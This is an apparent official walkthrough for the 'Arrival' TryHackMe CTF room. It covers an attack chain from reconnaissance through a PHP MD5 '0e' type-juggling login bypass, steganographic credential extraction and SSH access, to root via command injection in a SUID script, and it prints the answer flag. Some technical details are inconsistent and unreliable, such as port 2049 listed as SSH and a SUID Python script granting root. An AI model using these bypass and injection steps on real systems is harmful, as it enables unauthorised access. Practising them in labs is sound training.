# arrival-tryhackme-writeup
Official write-up for the Arrival TryHackMe CTF room.
 # Arrival — Official Walkthrough

## Introduction

Welcome to **Arrival**, a beginner-friendly Linux CTF focused on reconnaissance, web application analysis, authentication bypass, steganography, SSH enumeration, and privilege escalation.

The room follows a guided attack path. Intermediate clues are provided throughout the challenge to help you connect the different stages of the investigation.

By completing this room, you will practice:

* Network and service enumeration
* Web directory discovery
* Web application analysis
* PHP type-juggling authentication bypass
* MD5 hash analysis
* Steganography
* SSH enumeration
* SUID-based privilege escalation
* Command injection
* Linux privilege escalation

> **Note:** Replace `<TARGET-IP>` with the IP address assigned to your target machine.

---

# Phase 1 — Initial Reconnaissance

## 1. Nmap Scan

Begin by enumerating all TCP ports and identifying the services running on the target.

```bash
nmap -sV -sC -p- <TARGET-IP>
```

The scan should reveal the services required for the initial stages of the challenge.

Expected services include:

```text
22/tcp    SSH
80/tcp    HTTP
2049/tcp  SSH
```

**Screenshot:** Nmap scan output

The web server on port 80 is the most interesting starting point, so open the application in a browser:

```text
http://<TARGET-IP>/
```

---

# Phase 2 — Web Application Analysis

## 2. Directory Enumeration

Use a directory enumeration tool to identify additional web resources.

```bash
gobuster dir -u http://<TARGET-IP>/ \
-w /usr/share/wordlists/dirb/common.txt
```

**Screenshot:** Gobuster results

Among the discovered resources, investigate the application's terminal interface.

```text
http://<TARGET-IP>/terminal.php
```

---

## 3. Investigating the Main Page

The main page presents a fictional research archive belonging to **Dr. Louise Banks**.

Several clues immediately stand out:

* Linguistic research
* The Heptapod Prime Sequence
* Mathematical concepts
* Special authentication
* References to unusual hash patterns

The application appears to require a numerical sequence to access the research terminal.

---

# Phase 3 — Authentication Analysis

## 4. Investigating `terminal.php`

Navigate to:

```text
http://<TARGET-IP>/terminal.php
```

The page presents an authentication interface asking for the:

```text
Heptapod Prime Sequence
```

The page also contains a particularly useful clue:

> Look for numbers that produce MD5 hashes starting with `0e`.

This suggests that the authentication mechanism may be vulnerable to PHP type juggling.

---

## 5. Understanding the `0e` MD5 Vulnerability

PHP's loose comparison operator (`==`) can cause unexpected behavior when comparing strings that look like scientific notation.

For example, an MD5 hash such as:

```text
0e462097431906509019562988736854
```

can be interpreted numerically as zero when involved in a loose comparison.

Therefore, if an application performs a comparison similar to:

```php
md5($input) == $stored_hash
```

and the stored hash begins with `0e` followed entirely by digits, PHP may interpret both values as the number `0`.

This creates an authentication bypass.

The challenge therefore becomes finding an input whose MD5 hash matches this pattern:

```text
0e + digits
```

---

# Phase 4 — Finding the Magic Number

## 6. Finding a Suitable Input

One known value that produces the required MD5 pattern is:

```text
240610708
```

Its MD5 hash is:

```text
0e462097431906509019562988736854
```

The important property is that the hash begins with:

```text
0e
```

and everything after `0e` consists only of digits.

Other well-known examples exist, but for this challenge use:

```text
240610708
```

---

## 7. Bypassing Authentication

Enter the following value into the authentication field:

```text
240610708
```

The resulting hash is:

```text
md5("240610708")
=
0e462097431906509019562988736854
```

If the application performs a vulnerable loose comparison, PHP can interpret the hash as zero.

Conceptually:

```text
0 == "0e462097431906509019562988736854"
```

can evaluate as:

```text
true
```

This allows the authentication check to be bypassed.

**Screenshot:** Successful authentication

---

# Phase 5 — Research File Analysis

After successfully authenticating, several research files become available:

```text
communication_log.txt
pattern_analysis.dat
visual_sample.jpg
research_notes.txt
```

The next objective is to examine these files and identify information that can be used to obtain system access.

---

## 8. Communication Log

Read:

```text
communication_log.txt
```

The file contains several important clues.

Among them are references to:

* Embedded additional data
* A password hint: `nonlinear`
* A port in the `2000–2100` range

The reference to embedded data suggests that one of the visual research samples may contain hidden information.

---

## 9. Pattern Analysis

Next, examine:

```text
pattern_analysis.dat
```

The binary data reveals:

```text
HeptapodCommunicationProtocol
```

Additional information points toward a password structure involving:

```text
7circles_of_understanding
```

This is another important clue for the next stage.

---

## 10. Research Notes

The research notes reveal several critical pieces of information:

```text
Username: louise
SSH port: 2049
Password follows a 7-point circular pattern
Visual samples contain embedded credentials
```

At this point, we have enough information to investigate the image file.

---

# Phase 6 — Steganography

## 11. Download the Visual Sample

Download the image from the application:

```bash
wget "http://<TARGET-IP>/terminal.php?analyze=visual_sample.jpg" \
-O heptapod_image.jpg
```

**Screenshot:** Downloaded image

The earlier clue about embedded data suggests that the image should be inspected for hidden information.

---

## 12. Inspect the Image with Steghide

First, check whether the image contains embedded data:

```bash
steghide info heptapod_image.jpg
```

The password hint discovered earlier is:

```text
nonlinear
```

Attempt to extract the hidden data:

```bash
steghide extract -sf heptapod_image.jpg -p "nonlinear"
```

If successful, an extracted file will be created.

Read its contents:

```bash
cat extracted_data.txt
```

The extracted information contains Base64-encoded data.

After decoding it, the credentials are revealed:

```text
SSH_USER:louise
SSH_PASS:7circles_of_understanding
PORT:2049
```

We now have the credentials required to access the target over SSH.

---

# Phase 7 — SSH Access

## 13. Connect to the Target

Use the discovered username, password, and SSH port:

```bash
ssh -p 2049 louise@<TARGET-IP>
```

When prompted for the password, enter:

```text
7circles_of_understanding
```

After successful authentication, you should have a shell as:

```text
louise
```

---

# Phase 8 — Local Enumeration

## 14. Identify the Current User

Start with basic system enumeration:

```bash
id
whoami
ls -la
```

Confirm that the current user does not have administrative privileges.

Next, search for interesting scripts and SUID binaries:

```bash
find . -name "*.py" -type f 2>/dev/null
```

Then enumerate SUID files:

```bash
find / -perm -4000 -type f 2>/dev/null
```

During enumeration, an unusual Python script named `analyze.py` should be identified.

---

# Phase 9 — Privilege Escalation

## 15. Investigate `analyze.py`

Check its permissions:

```bash
ls -la analyze.py
```

The important part is that the file has the SUID bit set and is owned by root:

```text
-rwsr-xr-x 1 root root ... analyze.py
```

This means the script can execute with elevated privileges.

Read the source code:

```bash
cat analyze.py
```

The relevant command construction resembles:

```python
cmd = f"file '{input_file}' && hexdump -C '{input_file}' | head -20"
```

The application places user-controlled input directly into a shell command without properly sanitizing it.

This creates a command injection vulnerability.

---

## 16. Exploiting Command Injection

Because the script executes with elevated privileges, successful command injection can result in a privileged shell.

A payload used against the vulnerable input is:

```bash
./analyze "; /bin/bash"
```

The injected shell command causes `/bin/bash` to be executed.

If the SUID execution context is preserved, the resulting shell should have elevated privileges.

---

# Phase 10 — Root Access

## 17. Verify Privileges

Check the current user:

```bash
whoami
```

Expected result:

```text
root
```

Confirm with:

```bash
id
```

Expected output will indicate:

```text
uid=0(root)
```

You have successfully escalated from the `louise` account to root.

---

# Phase 11 — Capture the Final Flag

With root access obtained, read the final flag:

```bash
cat /root/final_flag.txt
```

The final flag is:

```text
CTF{und3rst4nd1ng_ch4ng3s_3v3ryth1ng}
```

---

# Conclusion

Congratulations! You have completed **Arrival**.

In this room, you followed a complete attack chain beginning with network reconnaissance and ending with root access.

The key techniques covered were:

1. Nmap service enumeration
2. Web directory discovery
3. Web application analysis
4. PHP type-juggling authentication bypass
5. MD5 `0e` hash behavior
6. Steganography
7. Credential extraction
8. SSH enumeration
9. SUID analysis
10. Command injection
11. Linux privilege escalation

The challenge demonstrates how seemingly unrelated clues can be combined to progress through a penetration test: information discovered in the web application leads to hidden credentials, those credentials provide SSH access, and local enumeration ultimately reveals the path to root.

**Final Flag:**

```text
CTF{und3rst4nd1ng_ch4ng3s_3v3ryth1ng}
```
